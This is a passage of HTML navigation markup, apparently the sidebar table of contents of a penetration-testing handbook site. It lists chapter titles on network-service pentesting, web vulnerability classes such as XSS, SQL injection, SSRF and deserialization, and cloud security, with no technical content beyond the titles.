href="../network-services-pentesting/8009-pentesting-apache-jserv-protocol-ajp.html"><strong aria-hidden="true">121.</strong> 8009 - Pentesting Apache JServ Protocol (AJP)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/8086-pentesting-influxdb.html"><strong aria-hidden="true">122.</strong> 8086 - Pentesting InfluxDB</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/8089-splunkd.html"><strong aria-hidden="true">123.</strong> 8089 - Pentesting Splunkd</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/8333-18333-38333-18444-pentesting-bitcoin.html"><strong aria-hidden="true">124.</strong> 8333,18333,38333,18444 - Pentesting Bitcoin</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/9000-pentesting-fastcgi.html"><strong aria-hidden="true">125.</strong> 9000 - Pentesting FastCGI</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/9001-pentesting-hsqldb.html"><strong aria-hidden="true">126.</strong> 9001 - Pentesting HSQLDB</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/cassandra.html"><strong aria-hidden="true">127.</strong> 9042/9160 - Pentesting Cassandra</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/9100-pjl.html"><strong aria-hidden="true">128.</strong> 9100 - Pentesting Raw Printing (JetDirect, AppSocket, PDL-datastream)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/9200-pentesting-elasticsearch.html"><strong aria-hidden="true">129.</strong> 9200 - Pentesting Elasticsearch</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/10000-network-data-management-protocol-ndmp.html"><strong aria-hidden="true">130.</strong> 10000 - Pentesting Network Data Management Protocol (ndmp)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/11211-memcache/index.html"><strong aria-hidden="true">131.</strong> 11211 - Pentesting Memcache</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../network-services-pentesting/11211-memcache/memcache-commands.html"><strong aria-hidden="true">131.1.</strong> Memcache Commands</a></li></ol></li><li class="chapter-item expanded "><a href="../network-services-pentesting/15672-pentesting-rabbitmq-management.html"><strong aria-hidden="true">132.</strong> 15672 - Pentesting RabbitMQ Management</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/24007-24008-24009-49152-pentesting-glusterfs.html"><strong aria-hidden="true">133.</strong> 24007,24008,24009,49152 - Pentesting GlusterFS</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/27017-27018-mongodb.html"><strong aria-hidden="true">134.</strong> 27017,27018 - Pentesting MongoDB</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/44134-pentesting-tiller-helm.html"><strong aria-hidden="true">135.</strong> 44134 - Pentesting Tiller (Helm)</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/44818-ethernetip.html"><strong aria-hidden="true">136.</strong> 44818/UDP/TCP - Pentesting EthernetIP</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/47808-udp-bacnet.html"><strong aria-hidden="true">137.</strong> 47808/udp - Pentesting BACNet</a></li><li class="chapter-item expanded "><a href="../network-services-pentesting/50030-50060-50070-50075-50090-pentesting-hadoop.html"><strong aria-hidden="true">138.</strong> 50030,50060,50070,50075,50090 - Pentesting Hadoop</a></li><li class="chapter-item expanded affix "><li class="part-title">🕸️ Pentesting Web</li><li class="chapter-item expanded "><a href="../pentesting-web/web-vulnerabilities-methodology.html"><strong aria-hidden="true">139.</strong> Web Vulnerabilities Methodology</a></li><li class="chapter-item expanded "><a href="../pentesting-web/pocs-and-polygloths-cheatsheet/index.html"><strong aria-hidden="true">140.</strong> Reflecting Techniques - PoCs and Polygloths CheatSheet</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/pocs-and-polygloths-cheatsheet/web-vulns-list.html"><strong aria-hidden="true">140.1.</strong> Web Vulns List</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/2fa-bypass.html"><strong aria-hidden="true">141.</strong> 2FA/MFA/OTP Bypass</a></li><li class="chapter-item expanded "><a href="../pentesting-web/account-takeover.html"><strong aria-hidden="true">142.</strong> Account Takeover</a></li><li class="chapter-item expanded "><a href="../pentesting-web/browser-extension-pentesting-methodology/index.html"><strong aria-hidden="true">143.</strong> Browser Extension Pentesting Methodology</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/browser-extension-pentesting-methodology/browext-clickjacking.html"><strong aria-hidden="true">143.1.</strong> BrowExt - ClickJacking</a></li><li class="chapter-item expanded "><a href="../pentesting-web/browser-extension-pentesting-methodology/browext-permissions-and-host_permissions.html"><strong aria-hidden="true">143.2.</strong> BrowExt - permissions & host_permissions</a></li><li class="chapter-item expanded "><a href="../pentesting-web/browser-extension-pentesting-methodology/browext-xss-example.html"><strong aria-hidden="true">143.3.</strong> BrowExt - XSS Example</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/bypass-payment-process.html"><strong aria-hidden="true">144.</strong> Bypass Payment Process</a></li><li class="chapter-item expanded "><a href="../pentesting-web/captcha-bypass.html"><strong aria-hidden="true">145.</strong> Captcha Bypass</a></li><li class="chapter-item expanded "><a href="../pentesting-web/cache-deception/index.html"><strong aria-hidden="true">146.</strong> Cache Poisoning and Cache Deception</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/cache-deception/cache-poisoning-via-url-discrepancies.html"><strong aria-hidden="true">146.1.</strong> Cache Poisoning via URL discrepancies</a></li><li class="chapter-item expanded "><a href="../pentesting-web/cache-deception/cache-poisoning-to-dos.html"><strong aria-hidden="true">146.2.</strong> Cache Poisoning to DoS</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/clickjacking.html"><strong aria-hidden="true">147.</strong> Clickjacking</a></li><li class="chapter-item expanded "><a href="../pentesting-web/client-side-template-injection-csti.html"><strong aria-hidden="true">148.</strong> Client Side Template Injection (CSTI)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/client-side-path-traversal.html"><strong aria-hidden="true">149.</strong> Client Side Path Traversal</a></li><li class="chapter-item expanded "><a href="../pentesting-web/command-injection.html"><strong aria-hidden="true">150.</strong> Command Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/content-security-policy-csp-bypass/index.html"><strong aria-hidden="true">151.</strong> Content Security Policy (CSP) Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/content-security-policy-csp-bypass/csp-bypass-self-+-unsafe-inline-with-iframes.html"><strong aria-hidden="true">151.1.</strong> CSP bypass: self + 'unsafe-inline' with Iframes</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/hacking-with-cookies/index.html"><strong aria-hidden="true">152.</strong> Cookies Hacking</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/hacking-with-cookies/cookie-tossing.html"><strong aria-hidden="true">152.1.</strong> Cookie Tossing</a></li><li class="chapter-item expanded "><a href="../pentesting-web/hacking-with-cookies/cookie-jar-overflow.html"><strong aria-hidden="true">152.2.</strong> Cookie Jar Overflow</a></li><li class="chapter-item expanded "><a href="../pentesting-web/hacking-with-cookies/cookie-bomb.html"><strong aria-hidden="true">152.3.</strong> Cookie Bomb</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/cors-bypass.html"><strong aria-hidden="true">153.</strong> CORS - Misconfigurations & Bypass</a></li><li class="chapter-item expanded "><a href="../pentesting-web/crlf-0d-0a.html"><strong aria-hidden="true">154.</strong> CRLF (%0D%0A) Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/csrf-cross-site-request-forgery.html"><strong aria-hidden="true">155.</strong> CSRF (Cross Site Request Forgery)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/dangling-markup-html-scriptless-injection/index.html"><strong aria-hidden="true">156.</strong> Dangling Markup - HTML scriptless injection</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/dangling-markup-html-scriptless-injection/ss-leaks.html"><strong aria-hidden="true">156.1.</strong> SS-Leaks</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/dependency-confusion.html"><strong aria-hidden="true">157.</strong> Dependency Confusion</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/index.html"><strong aria-hidden="true">158.</strong> Deserialization</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/nodejs-proto-prototype-pollution/index.html"><strong aria-hidden="true">158.1.</strong> NodeJS - __proto__ & prototype Pollution</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/nodejs-proto-prototype-pollution/client-side-prototype-pollution.html"><strong aria-hidden="true">158.1.1.</strong> Client Side Prototype Pollution</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/nodejs-proto-prototype-pollution/express-prototype-pollution-gadgets.html"><strong aria-hidden="true">158.1.2.</strong> Express Prototype Pollution Gadgets</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/nodejs-proto-prototype-pollution/prototype-pollution-to-rce.html"><strong aria-hidden="true">158.1.3.</strong> Prototype Pollution to RCE</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/java-jsf-viewstate-.faces-deserialization.html"><strong aria-hidden="true">158.2.</strong> Java JSF ViewState (.faces) Deserialization</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/java-dns-deserialization-and-gadgetprobe.html"><strong aria-hidden="true">158.3.</strong> Java DNS Deserialization, GadgetProbe and Java Deserialization Scanner</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/basic-java-deserialization-objectinputstream-readobject.html"><strong aria-hidden="true">158.4.</strong> Basic Java Deserialization (ObjectInputStream, readObject)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/php-deserialization-+-autoload-classes.html"><strong aria-hidden="true">158.5.</strong> PHP - Deserialization + Autoload Classes</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/java-transformers-to-rutime-exec-payload.html"><strong aria-hidden="true">158.6.</strong> CommonsCollection1 Payload - Java Transformers to Rutime exec() and Thread Sleep</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/basic-.net-deserialization-objectdataprovider-gadgets-expandedwrapper-and-json.net.html"><strong aria-hidden="true">158.7.</strong> Basic .Net deserialization (ObjectDataProvider gadget, ExpandedWrapper, and Json.Net)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/exploiting-__viewstate-knowing-the-secret.html"><strong aria-hidden="true">158.8.</strong> Exploiting __VIEWSTATE knowing the secrets</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/exploiting-__viewstate-parameter.html"><strong aria-hidden="true">158.9.</strong> Exploiting __VIEWSTATE without knowing the secrets</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/python-yaml-deserialization.html"><strong aria-hidden="true">158.10.</strong> Python Yaml Deserialization</a></li><li class="chapter-item expanded "><a href="../pentesting-web/deserialization/jndi-java-naming-and-directory-interface-and-log4shell.html"><strong aria-hidden="true">158.11.</strong> JNDI - Java Naming and Directory Interface & Log4Shell</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/domain-subdomain-takeover.html"><strong aria-hidden="true">159.</strong> Domain/Subdomain takeover</a></li><li class="chapter-item expanded "><a href="../pentesting-web/email-injections.html"><strong aria-hidden="true">160.</strong> Email Injections</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/index.html"><strong aria-hidden="true">161.</strong> File Inclusion/Path traversal</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/phar-deserialization.html"><strong aria-hidden="true">161.1.</strong> phar:// deserialization</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/lfi2rce-via-php-filters.html"><strong aria-hidden="true">161.2.</strong> LFI2RCE via PHP Filters</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/lfi2rce-via-nginx-temp-files.html"><strong aria-hidden="true">161.3.</strong> LFI2RCE via Nginx temp files</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/via-php_session_upload_progress.html"><strong aria-hidden="true">161.4.</strong> LFI2RCE via PHP_SESSION_UPLOAD_PROGRESS</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/lfi2rce-via-segmentation-fault.html"><strong aria-hidden="true">161.5.</strong> LFI2RCE via Segmentation Fault</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/lfi2rce-via-phpinfo.html"><strong aria-hidden="true">161.6.</strong> LFI2RCE via phpinfo()</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/lfi2rce-via-temp-file-uploads.html"><strong aria-hidden="true">161.7.</strong> LFI2RCE Via temp file uploads</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/lfi2rce-via-eternal-waiting.html"><strong aria-hidden="true">161.8.</strong> LFI2RCE via Eternal waiting</a></li><li class="chapter-item expanded "><a href="../pentesting-web/file-inclusion/lfi2rce-via-compress.zlib-+-php_stream_prefer_studio-+-path-disclosure.html"><strong aria-hidden="true">161.9.</strong> LFI2RCE Via compress.zlib + PHP_STREAM_PREFER_STUDIO + Path Disclosure</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/file-upload/index.html"><strong aria-hidden="true">162.</strong> File Upload</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/file-upload/pdf-upload-xxe-and-cors-bypass.html"><strong aria-hidden="true">162.1.</strong> PDF Upload - XXE and CORS bypass</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/formula-csv-doc-latex-ghostscript-injection.html"><strong aria-hidden="true">163.</strong> Formula/CSV/Doc/LaTeX/GhostScript Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/grpc-web-pentest.html"><strong aria-hidden="true">164.</strong> gRPC-Web Pentest</a></li><li class="chapter-item expanded "><a href="../pentesting-web/http-connection-contamination.html"><strong aria-hidden="true">165.</strong> HTTP Connection Contamination</a></li><li class="chapter-item expanded "><a href="../pentesting-web/http-connection-request-smuggling.html"><strong aria-hidden="true">166.</strong> HTTP Connection Request Smuggling</a></li><li class="chapter-item expanded "><a href="../pentesting-web/http-request-smuggling/index.html"><strong aria-hidden="true">167.</strong> HTTP Request Smuggling / HTTP Desync Attack</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/http-request-smuggling/browser-http-request-smuggling.html"><strong aria-hidden="true">167.1.</strong> Browser HTTP Request Smuggling</a></li><li class="chapter-item expanded "><a href="../pentesting-web/http-request-smuggling/request-smuggling-in-http-2-downgrades.html"><strong aria-hidden="true">167.2.</strong> Request Smuggling in HTTP/2 Downgrades</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/http-response-smuggling-desync.html"><strong aria-hidden="true">168.</strong> HTTP Response Smuggling / Desync</a></li><li class="chapter-item expanded "><a href="../pentesting-web/h2c-smuggling.html"><strong aria-hidden="true">169.</strong> Upgrade Header Smuggling</a></li><li class="chapter-item expanded "><a href="../pentesting-web/abusing-hop-by-hop-headers.html"><strong aria-hidden="true">170.</strong> hop-by-hop headers</a></li><li class="chapter-item expanded "><a href="../pentesting-web/idor.html"><strong aria-hidden="true">171.</strong> IDOR</a></li><li class="chapter-item expanded "><a href="../pentesting-web/hacking-jwt-json-web-tokens.html"><strong aria-hidden="true">172.</strong> JWT Vulnerabilities (Json Web Tokens)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/ldap-injection.html"><strong aria-hidden="true">173.</strong> LDAP Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/login-bypass/index.html"><strong aria-hidden="true">174.</strong> Login Bypass</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/login-bypass/sql-login-bypass.html"><strong aria-hidden="true">174.1.</strong> Login bypass List</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/nosql-injection.html"><strong aria-hidden="true">175.</strong> NoSQL injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/oauth-to-account-takeover.html"><strong aria-hidden="true">176.</strong> OAuth to Account takeover</a></li><li class="chapter-item expanded "><a href="../pentesting-web/open-redirect.html"><strong aria-hidden="true">177.</strong> Open Redirect</a></li><li class="chapter-item expanded "><a href="../pentesting-web/orm-injection.html"><strong aria-hidden="true">178.</strong> ORM Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/parameter-pollution.html"><strong aria-hidden="true">179.</strong> Parameter Pollution</a></li><li class="chapter-item expanded "><a href="../pentesting-web/phone-number-injections.html"><strong aria-hidden="true">180.</strong> Phone Number Injections</a></li><li class="chapter-item expanded "><a href="../pentesting-web/postmessage-vulnerabilities/index.html"><strong aria-hidden="true">181.</strong> PostMessage Vulnerabilities</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/postmessage-vulnerabilities/blocking-main-page-to-steal-postmessage.html"><strong aria-hidden="true">181.1.</strong> Blocking main page to steal postmessage</a></li><li class="chapter-item expanded "><a href="../pentesting-web/postmessage-vulnerabilities/bypassing-sop-with-iframes-1.html"><strong aria-hidden="true">181.2.</strong> Bypassing SOP with Iframes - 1</a></li><li class="chapter-item expanded "><a href="../pentesting-web/postmessage-vulnerabilities/bypassing-sop-with-iframes-2.html"><strong aria-hidden="true">181.3.</strong> Bypassing SOP with Iframes - 2</a></li><li class="chapter-item expanded "><a href="../pentesting-web/postmessage-vulnerabilities/steal-postmessage-modifying-iframe-location.html"><strong aria-hidden="true">181.4.</strong> Steal postmessage modifying iframe location</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/proxy-waf-protections-bypass.html"><strong aria-hidden="true">182.</strong> Proxy / WAF Protections Bypass</a></li><li class="chapter-item expanded "><a href="../pentesting-web/race-condition.html"><strong aria-hidden="true">183.</strong> Race Condition</a></li><li class="chapter-item expanded "><a href="../pentesting-web/rate-limit-bypass.html"><strong aria-hidden="true">184.</strong> Rate Limit Bypass</a></li><li class="chapter-item expanded "><a href="../pentesting-web/registration-vulnerabilities.html"><strong aria-hidden="true">185.</strong> Registration & Takeover Vulnerabilities</a></li><li class="chapter-item expanded "><a href="../pentesting-web/regular-expression-denial-of-service-redos.html"><strong aria-hidden="true">186.</strong> Regular expression Denial of Service - ReDoS</a></li><li class="chapter-item expanded "><a href="../pentesting-web/reset-password.html"><strong aria-hidden="true">187.</strong> Reset/Forgotten Password Bypass</a></li><li class="chapter-item expanded "><a href="../pentesting-web/reverse-tab-nabbing.html"><strong aria-hidden="true">188.</strong> Reverse Tab Nabbing</a></li><li class="chapter-item expanded "><a href="../pentesting-web/saml-attacks/index.html"><strong aria-hidden="true">189.</strong> SAML Attacks</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/saml-attacks/saml-basics.html"><strong aria-hidden="true">189.1.</strong> SAML Basics</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/server-side-inclusion-edge-side-inclusion-injection.html"><strong aria-hidden="true">190.</strong> Server Side Inclusion/Edge Side Inclusion Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/index.html"><strong aria-hidden="true">191.</strong> SQL Injection</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/ms-access-sql-injection.html"><strong aria-hidden="true">191.1.</strong> MS Access SQL Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/mssql-injection.html"><strong aria-hidden="true">191.2.</strong> MSSQL Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/mysql-injection/index.html"><strong aria-hidden="true">191.3.</strong> MySQL injection</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/mysql-injection/mysql-ssrf.html"><strong aria-hidden="true">191.3.1.</strong> MySQL File priv to SSRF/RCE</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/oracle-injection.html"><strong aria-hidden="true">191.4.</strong> Oracle injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/cypher-injection-neo4j.html"><strong aria-hidden="true">191.5.</strong> Cypher Injection (neo4j)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/postgresql-injection/index.html"><strong aria-hidden="true">191.6.</strong> PostgreSQL injection</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/postgresql-injection/dblink-lo_import-data-exfiltration.html"><strong aria-hidden="true">191.6.1.</strong> dblink/lo_import data exfiltration</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.html"><strong aria-hidden="true">191.6.2.</strong> PL/pgSQL Password Bruteforce</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/postgresql-injection/network-privesc-port-scanner-and-ntlm-chanllenge-response-disclosure.html"><strong aria-hidden="true">191.6.3.</strong> Network - Privesc, Port Scanner and NTLM chanllenge response disclosure</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/postgresql-injection/big-binary-files-upload-postgresql.html"><strong aria-hidden="true">191.6.4.</strong> Big Binary Files Upload (PostgreSQL)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-languages.html"><strong aria-hidden="true">191.6.5.</strong> RCE with PostgreSQL Languages</a></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/postgresql-injection/rce-with-postgresql-extensions.html"><strong aria-hidden="true">191.6.6.</strong> RCE with PostgreSQL Extensions</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/sqlmap/index.html"><strong aria-hidden="true">191.7.</strong> SQLMap - CheatSheet</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap.html"><strong aria-hidden="true">191.7.1.</strong> Second Order Injection - SQLMap</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/ssrf-server-side-request-forgery/index.html"><strong aria-hidden="true">192.</strong> SSRF (Server Side Request Forgery)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/ssrf-server-side-request-forgery/url-format-bypass.html"><strong aria-hidden="true">192.1.</strong> URL Format Bypass</a></li><li class="chapter-item expanded "><a href="../pentesting-web/ssrf-server-side-request-forgery/ssrf-vulnerable-platforms.html"><strong aria-hidden="true">192.2.</strong> SSRF Vulnerable Platforms</a></li><li class="chapter-item expanded "><a href="../pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"><strong aria-hidden="true">192.3.</strong> Cloud SSRF</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/ssti-server-side-template-injection/index.html"><strong aria-hidden="true">193.</strong> SSTI (Server Side Template Injection)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/ssti-server-side-template-injection/el-expression-language.html"><strong aria-hidden="true">193.1.</strong> EL - Expression Language</a></li><li class="chapter-item expanded "><a href="../pentesting-web/ssti-server-side-template-injection/jinja2-ssti.html"><strong aria-hidden="true">193.2.</strong> Jinja2 SSTI</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/timing-attacks.html"><strong aria-hidden="true">194.</strong> Timing Attacks</a></li><li class="chapter-item expanded "><a href="../pentesting-web/unicode-injection/index.html"><strong aria-hidden="true">195.</strong> Unicode Injection</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/unicode-injection/unicode-normalization.html"><strong aria-hidden="true">195.1.</strong> Unicode Normalization</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/uuid-insecurities.html"><strong aria-hidden="true">196.</strong> UUID Insecurities</a></li><li class="chapter-item expanded "><a href="../pentesting-web/websocket-attacks.html"><strong aria-hidden="true">197.</strong> WebSocket Attacks</a></li><li class="chapter-item expanded "><a href="../pentesting-web/web-tool-wfuzz.html"><strong aria-hidden="true">198.</strong> Web Tool - WFuzz</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xpath-injection.html"><strong aria-hidden="true">199.</strong> XPATH injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xslt-server-side-injection-extensible-stylesheet-language-transformations.html"><strong aria-hidden="true">200.</strong> XSLT Server Side Injection (Extensible Stylesheet Language Transformations)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xxe-xee-xml-external-entity.html"><strong aria-hidden="true">201.</strong> XXE - XEE - XML External Entity</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/index.html"><strong aria-hidden="true">202.</strong> XSS (Cross Site Scripting)</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/abusing-service-workers.html"><strong aria-hidden="true">202.1.</strong> Abusing Service Workers</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/chrome-cache-to-xss.html"><strong aria-hidden="true">202.2.</strong> Chrome Cache to XSS</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/debugging-client-side-js.html"><strong aria-hidden="true">202.3.</strong> Debugging Client Side JS</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/dom-clobbering.html"><strong aria-hidden="true">202.4.</strong> Dom Clobbering</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/dom-invader.html"><strong aria-hidden="true">202.5.</strong> DOM Invader</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/dom-xss.html"><strong aria-hidden="true">202.6.</strong> DOM XSS</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/iframes-in-xss-and-csp.html"><strong aria-hidden="true">202.7.</strong> Iframes in XSS, CSP and SOP</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/integer-overflow.html"><strong aria-hidden="true">202.8.</strong> Integer Overflow</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/js-hoisting.html"><strong aria-hidden="true">202.9.</strong> JS Hoisting</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/other-js-tricks.html"><strong aria-hidden="true">202.10.</strong> Misc JS Tricks & Relevant Info</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/pdf-injection.html"><strong aria-hidden="true">202.11.</strong> PDF Injection</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html"><strong aria-hidden="true">202.12.</strong> Server Side XSS (Dynamic PDF)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/shadow-dom.html"><strong aria-hidden="true">202.13.</strong> Shadow DOM</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/some-same-origin-method-execution.html"><strong aria-hidden="true">202.14.</strong> SOME - Same Origin Method Execution</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/sniff-leak.html"><strong aria-hidden="true">202.15.</strong> Sniff Leak</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/steal-info-js.html"><strong aria-hidden="true">202.16.</strong> Steal Info JS</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xss-cross-site-scripting/xss-in-markdown.html"><strong aria-hidden="true">202.17.</strong> XSS in Markdown</a></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/xssi-cross-site-script-inclusion.html"><strong aria-hidden="true">203.</strong> XSSI (Cross-Site Script Inclusion)</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/index.html"><strong aria-hidden="true">204.</strong> XS-Search/XS-Leaks</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/connection-pool-example.html"><strong aria-hidden="true">204.1.</strong> Connection Pool Examples</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/connection-pool-by-destination-example.html"><strong aria-hidden="true">204.2.</strong> Connection Pool by Destination Example</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/cookie-bomb-+-onerror-xs-leak.html"><strong aria-hidden="true">204.3.</strong> Cookie Bomb + Onerror XS Leak</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/url-max-length-client-side.html"><strong aria-hidden="true">204.4.</strong> URL Max Length - Client Side</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/performance.now-example.html"><strong aria-hidden="true">204.5.</strong> performance.now example</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/performance.now-+-force-heavy-task.html"><strong aria-hidden="true">204.6.</strong> performance.now + Force heavy task</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/event-loop-blocking-+-lazy-images.html"><strong aria-hidden="true">204.7.</strong> Event Loop Blocking + Lazy images</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/javascript-execution-xs-leak.html"><strong aria-hidden="true">204.8.</strong> JavaScript Execution XS Leak</a></li><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/css-injection/index.html"><strong aria-hidden="true">204.9.</strong> CSS Injection</a></li><li><ol class="section"><li class="chapter-item expanded "><a href="../pentesting-web/xs-search/css-injection/css-injection-code.html"><strong aria-hidden="true">204.9.1.</strong> CSS Injection Code</a></li></ol></li></ol></li><li class="chapter-item expanded "><a href="../pentesting-web/iframe-traps.html"><strong aria-hidden="true">205.</strong> Iframe Traps</a></li><li class="chapter-item expanded affix "><li class="part-title">⛈️ Cloud Security</li><li class="chapter-item expanded "><a href="../https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security.html"><strong aria-hidden="true">206.</strong> Pentesting Kubernetes</a></li><li class="chapter-item expanded "><a href="../https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology.html"><strong 